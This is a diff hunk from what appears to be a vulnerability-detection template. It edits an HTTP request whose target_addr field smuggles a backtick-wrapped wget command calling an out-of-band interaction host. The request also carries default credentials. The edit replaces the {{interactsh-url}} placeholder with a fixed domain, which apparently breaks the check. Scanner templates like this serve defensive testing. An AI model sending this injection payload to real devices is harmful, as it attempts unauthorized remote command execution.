@@ -28,7 +28,7 @@ http:
         User: e8c
         Password: e8c
 
-        target_addr="1.1.1.1+`wget+http%3A%2F%2F{{interactsh-url}}%2F`"&waninf=127.0.0.1"
+        target_addr="1.1.1.1+`wget+http%3A%2F%2Finteractsh-url.com%2F`"&waninf=127.0.0.1"
 
     matchers:
       - type: word
